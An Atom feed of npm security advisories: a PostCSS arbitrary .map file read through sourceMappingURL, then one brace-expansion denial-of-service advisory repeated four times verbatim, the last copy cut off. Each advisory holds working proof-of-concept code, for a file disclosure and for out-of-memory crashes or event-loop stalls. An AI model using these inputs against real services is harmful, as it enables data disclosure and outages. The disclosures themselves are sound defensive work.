<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-08-03T17:45:49.844Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[postcss] PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset]]></title>
        <id>https://github.com/advisories/GHSA-fxqj-rqcc-2cmp</id>
        <link href="https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"/>
        <updated>2026-08-03T17:11:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for GHSA-6g55-p6wh-862q added a guard in <code>lib/previous-map.js</code> <code>PreviousMap.loadFile()</code> that restricts an attacker-controlled <code>sourceMappingURL</code> (from a CSS comment) to a <code>.map</code> extension and, for untrusted maps, rejects <code>..</code> traversal and absolute paths. The traversal/absolute rejection is nested inside <code>if (cssFile) { ... }</code>. When PostCSS is invoked without the <code>from</code> option, <code>cssFile</code> is falsy and that branch is skipped, leaving only the <code>.map</code> extension check.</p>
<p><code>PreviousMap</code> is constructed by <code>lib/input.js</code> whenever <code>pathAvailable &amp;&amp; sourceMapAvailable</code> (under Node with source-map available), independent of <code>opts.from</code>/<code>opts.map</code> (the constructor returns early only for <code>opts.map === false</code>). So <code>postcss([]).process(css)</code> on attacker CSS reaches <code>loadFile</code> with <code>cssFile</code> undefined, and an attacker <code>/*# sourceMappingURL=/abs/path/x.map */</code> (or <code>../</code>-traversing path) is read via <code>readFileSync</code>. When the file is valid JSON, its <code>sources</code> (filesystem paths) and <code>sourcesContent</code> (source contents) are disclosed in the generated source map.</p>
<h2 id="affected-code-v8522--the-release-carrying-the-ghsa-6g55-fix">Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)</h2>
<pre><code class="language-js">// lib/previous-map.js
loadFile(path, cssFile, trusted) {
  if (!trusted &amp;&amp; !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
    if (cssFile) {                       // guard runs ONLY when `from` is set
      let relativePath = relative(dirname(cssFile), path)
      if (relativePath === '..' ||
          relativePath.startsWith('..' + sep) ||
          isAbsolute(relativePath)) {
        return undefined
      }
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()   // sink
  }
}

// loadMap(): untrusted annotation path, trusted=false; file === opts.from
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)   // no `from` -&gt; map stays the raw URL
  let unknown = this.loadFile(map, file, false)  // file undefined -&gt; cssFile falsy
</code></pre>
<h2 id="proof-of-concept-verified-on-postcss-8522">Proof of concept (verified on postcss 8.5.22)</h2>
<pre><code class="language-js">const postcss = require('postcss')
const fs = require('fs')

// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)
const secret = '/tmp/pcpoc/secret_out_of_tree.map'
fs.writeFileSync(secret, JSON.stringify({
  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],
  sourcesContent: ['TOP_SECRET_abcdef']
}))

const css = 'a{color:red}\n/*# sourceMappingURL=' + secret + ' */'
const leaks = m =&gt; m &amp;&amp; JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')

;(async () =&gt; {
  // A) NO `from`  -&gt; guard skipped -&gt; arbitrary absolute .map read + disclosed
  const a = await postcss([]).process(css, { map: true })
  console.log('no from   -&gt; leaked:', !!leaks(a.map))   // true

  // B) WITH `from` -&gt; guard active -&gt; blocked
  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })
  console.log('with from -&gt; leaked:', !!leaks(b.map))    // false
})()
</code></pre>
<p>Observed output on postcss 8.5.22:</p>
<pre><code>no from   -&gt; leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map
with from -&gt; leaked: false     # guard rejects the absolute path
</code></pre>
<p><code>../</code> traversal (no <code>from</code>) also succeeds; non-<code>.map</code> targets (<code>.txt</code>, <code>?x=.map</code>, <code>#.map</code>) are blocked by the <code>.map</code> check. The tested build contains the GHSA-6g55 fix (<code>this.json = JSON.parse(...)</code> in <code>loadMap</code>, <code>consumer()</code> uses <code>this.json || this.text</code>), so this is a residual of that fix.</p>
<h2 id="impact">Impact</h2>
<p>Arbitrary <code>.map</code>-file read (absolute path or <code>../</code> traversal) and disclosure of the target map's <code>sources</code> (local filesystem paths) and <code>sourcesContent</code> (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a <code>from</code> option and exposes <code>result.map</code> (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in <code>.map</code> that parse as JSON.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Apply the traversal/absolute-path rejection to the untrusted map path regardless of whether <code>cssFile</code> is present (resolve against <code>process.cwd()</code> when there is no <code>cssFile</code>, and reject absolute paths and <code>..</code> escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp">https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp</a></li>
<li><a href="https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8">https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8</a></li>
<li><a href="https://github.com/postcss/postcss/releases/tag/8.5.19">https://github.com/postcss/postcss/releases/tag/8.5.19</a></li>
<li><a href="https://github.com/advisories/GHSA-fxqj-rqcc-2cmp">https://github.com/advisories/GHSA-fxqj-rqcc-2cmp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxqj-rqcc-2cmp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T17:11:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded intermediate arrays, bypassing the CVE-2026-14257 mitigation]]></title>
        <id>https://github.com/advisories/GHSA-rgw5-rvv9-x895</id>
        <link href="https://github.com/advisories/GHSA-rgw5-rvv9-x895"/>
        <updated>2026-08-03T16:35:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>maxLength</code> mitigation added in <code>5.0.8</code> for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are <em>combined</em>, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an <strong>uncatchable</strong> out-of-memory error, so <code>try/catch</code> around <code>expand()</code> does not help.</p>
<p>A second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.</p>
<h3 id="details">Details</h3>
<p><code>maxLength</code> was enforced in <code>combine()</code>, the single place output grows. Two arrays are built <em>before</em> <code>combine()</code> runs, and neither was bounded.</p>
<p><strong>1. Comma alternatives accumulate without a running total (memory exhaustion)</strong></p>
<p>Each alternative in <code>{a,b,c,...}</code> is expanded by its own recursive <code>expand_()</code> call, so each receives a full, independent <code>maxLength</code> allowance. The results were then concatenated into a single <code>values</code> array with no cumulative limit:</p>
<pre><code class="language-js">values = []
for (let j = 0; j &lt; n.length; j++) {
  values.push.apply(values, expand_(n[j], max, maxLength, false))
}

acc = combine(acc, pre, values, max, maxLength, ...)
</code></pre>
<p>With <code>A</code> alternatives, <code>values</code> can reach <code>A * maxLength</code> characters before <code>combine()</code> gets a chance to truncate it. At the default <code>maxLength</code> of 4,000,000 and 400 alternatives, that is well past any default heap.</p>
<p><strong>2. Padded sequences ignore <code>maxLength</code> while generating (CPU exhaustion)</strong></p>
<p><code>expandSequence()</code> was bounded by <code>max</code> (the result <em>count</em>) but never consulted <code>maxLength</code>. A padded sequence's element width follows the input, so <code>{0...01..100000}</code> with a wide pad generates <code>max</code> elements, each as wide as the input, only for <code>combine()</code> to discard all but a handful.</p>
<p>Memory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to <code>max * width</code>.</p>
<table>
<thead>
<tr>
<th>pad width</th>
<th>input bytes</th>
<th>results kept</th>
<th>time (5.0.8)</th>
<th>time (patched)</th>
</tr>
</thead>
<tbody><tr>
<td>20,000</td>
<td>20 KB</td>
<td>199</td>
<td>~7.3 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>100,000</td>
<td>100 KB</td>
<td>39</td>
<td>~32 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>400,000</td>
<td>400 KB</td>
<td>9</td>
<td>~124 s</td>
<td>~18 ms</td>
</tr>
</tbody></table>
<p>Output is byte-identical before and after the fix; only the wasted work is removed.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Memory exhaustion, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

const part = '{' + '0'.repeat(50) + '1..100000}'
const input = '{' + Array(400).fill(part).join(',') + '}'  // ~25 KB

try {
  expand(input)
} catch (e) {
  // never reached - the process is already dead
}
</code></pre>
<pre><code>FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
Aborted
</code></pre>
<p>Event-loop stall, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU
expand('{' + '0'.repeat(400_000) + '1..100000}')
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service. Any application that passes attacker-controlled input to <code>expand()</code>, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with <code>try/catch</code>.</p>
<p>Applications already on <code>5.0.8</code> are affected: the <code>5.0.8</code> mitigation does not cover these paths.</p>
<h3 id="patches">Patches</h3>
<p>Both intermediate arrays are now bounded as they are built, using the same <code>max</code> and <code>maxLength</code> limits already applied in <code>combine()</code>:</p>
<ul>
<li><code>values</code> tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.</li>
<li><code>expandSequence()</code> accepts <code>maxLength</code> and stops generating once the sequence's own characters reach it.</li>
</ul>
<p>As with the existing limits, output is truncated rather than allowed to grow without bound, which matches how <code>max</code> already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, avoid passing untrusted input to <code>expand()</code> or to glob brace patterns, or pass an explicitly small <code>max</code> <strong>and</strong> <code>maxLength</code>.</p>
<p>Note that a small <code>maxLength</code> alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.</p>
<h3 id="credits">Credits</h3>
<p>The memory-exhaustion bypass was reported by Alessio Della Libera, CEO &amp; Co-founder at <a href="https://numyra.ai/">Numyra</a>.</p>
<p>The sequence-generation issue was found while verifying that report.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac">https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf">https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
<li><a href="https://github.com/advisories/GHSA-rgw5-rvv9-x895">https://github.com/advisories/GHSA-rgw5-rvv9-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgw5-rvv9-x895</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded intermediate arrays, bypassing the CVE-2026-14257 mitigation]]></title>
        <id>https://github.com/advisories/GHSA-rgw5-rvv9-x895</id>
        <link href="https://github.com/advisories/GHSA-rgw5-rvv9-x895"/>
        <updated>2026-08-03T16:35:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>maxLength</code> mitigation added in <code>5.0.8</code> for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are <em>combined</em>, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an <strong>uncatchable</strong> out-of-memory error, so <code>try/catch</code> around <code>expand()</code> does not help.</p>
<p>A second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.</p>
<h3 id="details">Details</h3>
<p><code>maxLength</code> was enforced in <code>combine()</code>, the single place output grows. Two arrays are built <em>before</em> <code>combine()</code> runs, and neither was bounded.</p>
<p><strong>1. Comma alternatives accumulate without a running total (memory exhaustion)</strong></p>
<p>Each alternative in <code>{a,b,c,...}</code> is expanded by its own recursive <code>expand_()</code> call, so each receives a full, independent <code>maxLength</code> allowance. The results were then concatenated into a single <code>values</code> array with no cumulative limit:</p>
<pre><code class="language-js">values = []
for (let j = 0; j &lt; n.length; j++) {
  values.push.apply(values, expand_(n[j], max, maxLength, false))
}

acc = combine(acc, pre, values, max, maxLength, ...)
</code></pre>
<p>With <code>A</code> alternatives, <code>values</code> can reach <code>A * maxLength</code> characters before <code>combine()</code> gets a chance to truncate it. At the default <code>maxLength</code> of 4,000,000 and 400 alternatives, that is well past any default heap.</p>
<p><strong>2. Padded sequences ignore <code>maxLength</code> while generating (CPU exhaustion)</strong></p>
<p><code>expandSequence()</code> was bounded by <code>max</code> (the result <em>count</em>) but never consulted <code>maxLength</code>. A padded sequence's element width follows the input, so <code>{0...01..100000}</code> with a wide pad generates <code>max</code> elements, each as wide as the input, only for <code>combine()</code> to discard all but a handful.</p>
<p>Memory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to <code>max * width</code>.</p>
<table>
<thead>
<tr>
<th>pad width</th>
<th>input bytes</th>
<th>results kept</th>
<th>time (5.0.8)</th>
<th>time (patched)</th>
</tr>
</thead>
<tbody><tr>
<td>20,000</td>
<td>20 KB</td>
<td>199</td>
<td>~7.3 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>100,000</td>
<td>100 KB</td>
<td>39</td>
<td>~32 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>400,000</td>
<td>400 KB</td>
<td>9</td>
<td>~124 s</td>
<td>~18 ms</td>
</tr>
</tbody></table>
<p>Output is byte-identical before and after the fix; only the wasted work is removed.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Memory exhaustion, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

const part = '{' + '0'.repeat(50) + '1..100000}'
const input = '{' + Array(400).fill(part).join(',') + '}'  // ~25 KB

try {
  expand(input)
} catch (e) {
  // never reached - the process is already dead
}
</code></pre>
<pre><code>FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
Aborted
</code></pre>
<p>Event-loop stall, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU
expand('{' + '0'.repeat(400_000) + '1..100000}')
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service. Any application that passes attacker-controlled input to <code>expand()</code>, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with <code>try/catch</code>.</p>
<p>Applications already on <code>5.0.8</code> are affected: the <code>5.0.8</code> mitigation does not cover these paths.</p>
<h3 id="patches">Patches</h3>
<p>Both intermediate arrays are now bounded as they are built, using the same <code>max</code> and <code>maxLength</code> limits already applied in <code>combine()</code>:</p>
<ul>
<li><code>values</code> tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.</li>
<li><code>expandSequence()</code> accepts <code>maxLength</code> and stops generating once the sequence's own characters reach it.</li>
</ul>
<p>As with the existing limits, output is truncated rather than allowed to grow without bound, which matches how <code>max</code> already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, avoid passing untrusted input to <code>expand()</code> or to glob brace patterns, or pass an explicitly small <code>max</code> <strong>and</strong> <code>maxLength</code>.</p>
<p>Note that a small <code>maxLength</code> alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.</p>
<h3 id="credits">Credits</h3>
<p>The memory-exhaustion bypass was reported by Alessio Della Libera, CEO &amp; Co-founder at <a href="https://numyra.ai/">Numyra</a>.</p>
<p>The sequence-generation issue was found while verifying that report.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac">https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf">https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
<li><a href="https://github.com/advisories/GHSA-rgw5-rvv9-x895">https://github.com/advisories/GHSA-rgw5-rvv9-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgw5-rvv9-x895</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded intermediate arrays, bypassing the CVE-2026-14257 mitigation]]></title>
        <id>https://github.com/advisories/GHSA-rgw5-rvv9-x895</id>
        <link href="https://github.com/advisories/GHSA-rgw5-rvv9-x895"/>
        <updated>2026-08-03T16:35:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>maxLength</code> mitigation added in <code>5.0.8</code> for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are <em>combined</em>, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an <strong>uncatchable</strong> out-of-memory error, so <code>try/catch</code> around <code>expand()</code> does not help.</p>
<p>A second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.</p>
<h3 id="details">Details</h3>
<p><code>maxLength</code> was enforced in <code>combine()</code>, the single place output grows. Two arrays are built <em>before</em> <code>combine()</code> runs, and neither was bounded.</p>
<p><strong>1. Comma alternatives accumulate without a running total (memory exhaustion)</strong></p>
<p>Each alternative in <code>{a,b,c,...}</code> is expanded by its own recursive <code>expand_()</code> call, so each receives a full, independent <code>maxLength</code> allowance. The results were then concatenated into a single <code>values</code> array with no cumulative limit:</p>
<pre><code class="language-js">values = []
for (let j = 0; j &lt; n.length; j++) {
  values.push.apply(values, expand_(n[j], max, maxLength, false))
}

acc = combine(acc, pre, values, max, maxLength, ...)
</code></pre>
<p>With <code>A</code> alternatives, <code>values</code> can reach <code>A * maxLength</code> characters before <code>combine()</code> gets a chance to truncate it. At the default <code>maxLength</code> of 4,000,000 and 400 alternatives, that is well past any default heap.</p>
<p><strong>2. Padded sequences ignore <code>maxLength</code> while generating (CPU exhaustion)</strong></p>
<p><code>expandSequence()</code> was bounded by <code>max</code> (the result <em>count</em>) but never consulted <code>maxLength</code>. A padded sequence's element width follows the input, so <code>{0...01..100000}</code> with a wide pad generates <code>max</code> elements, each as wide as the input, only for <code>combine()</code> to discard all but a handful.</p>
<p>Memory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to <code>max * width</code>.</p>
<table>
<thead>
<tr>
<th>pad width</th>
<th>input bytes</th>
<th>results kept</th>
<th>time (5.0.8)</th>
<th>time (patched)</th>
</tr>
</thead>
<tbody><tr>
<td>20,000</td>
<td>20 KB</td>
<td>199</td>
<td>~7.3 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>100,000</td>
<td>100 KB</td>
<td>39</td>
<td>~32 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>400,000</td>
<td>400 KB</td>
<td>9</td>
<td>~124 s</td>
<td>~18 ms</td>
</tr>
</tbody></table>
<p>Output is byte-identical before and after the fix; only the wasted work is removed.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Memory exhaustion, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

const part = '{' + '0'.repeat(50) + '1..100000}'
const input = '{' + Array(400).fill(part).join(',') + '}'  // ~25 KB

try {
  expand(input)
} catch (e) {
  // never reached - the process is already dead
}
</code></pre>
<pre><code>FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
Aborted
</code></pre>
<p>Event-loop stall, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU
expand('{' + '0'.repeat(400_000) + '1..100000}')
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service. Any application that passes attacker-controlled input to <code>expand()</code>, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with <code>try/catch</code>.</p>
<p>Applications already on <code>5.0.8</code> are affected: the <code>5.0.8</code> mitigation does not cover these paths.</p>
<h3 id="patches">Patches</h3>
<p>Both intermediate arrays are now bounded as they are built, using the same <code>max</code> and <code>maxLength</code> limits already applied in <code>combine()</code>:</p>
<ul>
<li><code>values</code> tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.</li>
<li><code>expandSequence()</code> accepts <code>maxLength</code> and stops generating once the sequence's own characters reach it.</li>
</ul>
<p>As with the existing limits, output is truncated rather than allowed to grow without bound, which matches how <code>max</code> already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, avoid passing untrusted input to <code>expand()</code> or to glob brace patterns, or pass an explicitly small <code>max</code> <strong>and</strong> <code>maxLength</code>.</p>
<p>Note that a small <code>maxLength</code> alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.</p>
<h3 id="credits">Credits</h3>
<p>The memory-exhaustion bypass was reported by Alessio Della Libera, CEO &amp; Co-founder at <a href="https://numyra.ai/">Numyra</a>.</p>
<p>The sequence-generation issue was found while verifying that report.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac">https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf">https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
<li><a href="https://github.com/advisories/GHSA-rgw5-rvv9-x895">https://github.com/advisories/GHSA-rgw5-rvv9-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgw5-rvv9-x895</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded intermediate arrays, bypassing the CVE-2026-14257 mitigation]]></title>
        <id>https://github.com/advisories/GHSA-rgw5-rvv9-x895</id>
        <link href="https://github.com/advisories/GHSA-rgw5-rvv9-x895"/>
        <updated>2026-08-03T16:35:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>maxLength</code> mitigation added in <code>5.0.8</code> for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are <em>combined</em>, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an <strong>uncatchable</strong> out-of-memory error, so <code>try/catch</code> around <code>expand()</code> does not help.</p>
<p>A second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.</p>
<h3 id="details">Details</h3>
<p><code>maxLength</code> was enforced in <code>combine()</code>, the single place output grows. Two arrays are built <em>before</em> <code>combine()</code> runs, and neither was bounded.</p>
<p><strong>1. Comma alternatives accumulate without a running total (memory exhaustion)</strong></p>
<p>Each alternative in <code>{a,b,c,...}</code> is expanded by its own recursive <code>expand_()</code> call, so each receives a full, independent <code>maxLength</code> allowance. The results were then concatenated into a single <code>values</code> array with no cumulative limit:</p>
<pre><code class="language-js">values = []
for (let j = 0; j &lt; n.length; j++) {
  values.push.apply(values, expand_(n[j], max, maxLength, false))
}

acc = combine(acc, pre, values, max, maxLength, ...)
</code></pre>
<p>With <code>A</code> alternatives, <code>values</code> can reach <code>A * maxLength</code> characters before <code>combine()</code> gets a chance to truncate it. At the default <code>maxLength</code> of 4,000,000 and 400 alternatives, that is well past any default heap.</p>
<p><strong>2. Padded sequences ignore <code>maxLength</code> while generating (CPU exhaustion)</strong></p>
<p><code>expandSequence()</code> was bounded by <code>max</code> (the result <em>count</em>) but never consulted <code>maxLength</code>. A padded sequence's element width follows the input, so <code>{0...01..100000}</code> with a wide pad generates <code>max</code> elements, each as wide as the input, only for <code>combine()</code> to discard all but a handful.</p>
<p>Memory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to <code>max * width</code>.</p>
<table>
<thead>
<tr>
<th>pad width</th>
<th>input bytes</th>
<th>results kept</th>
<th>time (5.0.8)</th>
<th>time (patched)</th>
</tr>
</thead>
<tbody><tr>
<td>20,000</td>
<td>20 KB</td>
<td>199</td>
<td>~7.3 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>100,000</td>
<td>100 KB</td>
<td>39</td>
<td>~32 s</td>
<td>~20 ms</td>
</tr>
<tr>
<td>400,000</td>
<td>400 KB</td>
<td>9</td>
<td>~124 s</td>
<td>~18 ms</td>
</tr>
</tbody></table>
<p>Output is byte-identical before and after the fix; only the wasted work is removed.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Memory exhaustion, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

const part = '{' + '0'.repeat(50) + '1..100000}'
const input = '{' + Array(400).fill(part).join(',') + '}'  // ~25 KB

try {
  expand(input)
} catch (e) {
  // never reached - the process is already dead
}
</code></pre>
<pre><code>FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
Aborted
</code></pre>
<p>Event-loop stall, against <code>5.0.8</code>:</p>
<pre><code class="language-js">import { expand } from 'brace-expansion'

// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU
expand('{' + '0'.repeat(400_000) + '1..100000}')
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service. Any application that passes attacker-controlled input to <code>expand()</code>, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with <code>try/catch</code>.</p>
<p>Applications already on <code>5.0.8</code> are affected: the <code>5.0.8</code> mitigation does not cover these paths.</p>
<h3 id="patches">Patches</h3>
